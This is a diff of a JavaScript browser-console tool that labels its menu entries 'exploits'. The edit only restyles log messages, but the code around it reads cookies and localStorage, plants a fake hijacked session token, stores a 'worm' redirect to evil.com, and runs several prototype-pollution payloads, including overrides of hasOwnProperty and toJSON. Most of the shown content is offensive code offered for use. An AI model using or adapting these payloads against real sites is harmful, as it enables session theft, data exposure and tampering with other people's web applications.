@@ -44,10 +44,10 @@
         { id: 25, description: "Extract all links from the page" }
     ];
 
-    // ✅ Display available options in a nicely formatted table
+    //  Display available options in a nicely formatted table
     console.table(exploitOptions);
 
-    // ✅ Function to execute specific exploits
+    //  Function to execute specific exploits
     window.enumerateDOM = async function (option) {
         console.log(`🚀 Running Exploit #${option}: ${exploitOptions[option - 1]?.description || "Invalid Option"}`);
 
@@ -59,13 +59,13 @@
             case 2:
                 try {
                     await document.requestStorageAccess();
-                    console.log("✅ Storage access granted");
+                    console.log("[*] Storage access granted");
                 } catch (err) {
-                    console.warn("❌ Storage access denied", err);
+                    console.warn("[*] Storage access denied", err);
                 }
                 break;
             case 3:
-                console.log("🍪 Cookies:", document.cookie);
+                console.log("[-] Cookies:", document.cookie);
                 break;
             case 4:
                 setInterval(async () => console.log("📡 Storage Access:", await document.hasStorageAccess()), 5000);
@@ -75,7 +75,7 @@
                 break;
             case 6:
                 localStorage.setItem("session", "hacked-session-token");
-                console.log("🚨 Session Hijacked!");
+                console.log("[-] Session Hijacked!");
                 break;
             case 7:
                 console.table({...localStorage});
@@ -104,7 +104,7 @@
                 console.log("CSP Directives:", document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content);
                 break;
             case 14:
-                navigator.storage.estimate().then(data => console.log("💾 Storage Quota:", data));
+                navigator.storage.estimate().then(data => console.log("[+] Storage Quota:", data));
                 break;
             case 15:
                 localStorage.setItem("worm", "document.location='https://evil.com'");
@@ -113,23 +113,23 @@
             // 📌 16-20: Advanced Prototype Pollution Attacks
             case 16:
                 Object.prototype.hacked = "Yes, global pollution!";
-                console.log("🚨 Prototype Pollution Successful:", {}.hacked);
+                console.log("[-] Prototype Pollution Successful:", {}.hacked);
                 break;
             case 17:
                 Object.prototype.hasOwnProperty = () => true;
-                console.log("🛑 hasOwnProperty Override Active!");
+                console.log("[-] hasOwnProperty Override Active!");
                 break;
             case 18:
                 Object.setPrototypeOf({}, { isAdmin: true });
-                console.log("🔓 Admin Access Granted?", {}.isAdmin);
+                console.log("[-] Admin Access Granted?", {}.isAdmin);
                 break;
             case 19:
                 Function.prototype.constructor.prototype.hacked = "Global attack!";
-                console.log("🚨 Function Constructor Polluted:", Object.prototype.hacked);
+                console.log("[-] Function Constructor Polluted:", Object.prototype.hacked);
                 break;
             case 20:
                 Object.prototype.toJSON = () => "Hacked JSON!";
-                console.log("📡 JSON.stringify Attack:", JSON.stringify({}));
+                console.log("[+] JSON.stringify Attack:", JSON.stringify({}));
                 break;
 
             // 📌 21-25: DOM Enumeration
